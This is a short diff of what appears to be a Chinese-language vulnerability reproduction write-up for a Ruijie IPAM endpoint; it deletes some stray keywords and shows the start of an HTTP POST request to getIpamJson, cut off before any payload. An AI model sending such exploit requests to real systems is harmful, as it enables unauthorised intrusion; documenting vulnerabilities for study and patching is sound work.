@@ -33,14 +33,6 @@ public function getIpamJsonAction() {
 
 # 漏洞复现
 
-深入探索
-
-VPN
-
-软件
-
-网络
-
 ```
 POST /ddi/server/ipam.php?a=getIpamJson HTTP/1.1
 Host: ruijieweb.mrxn.net
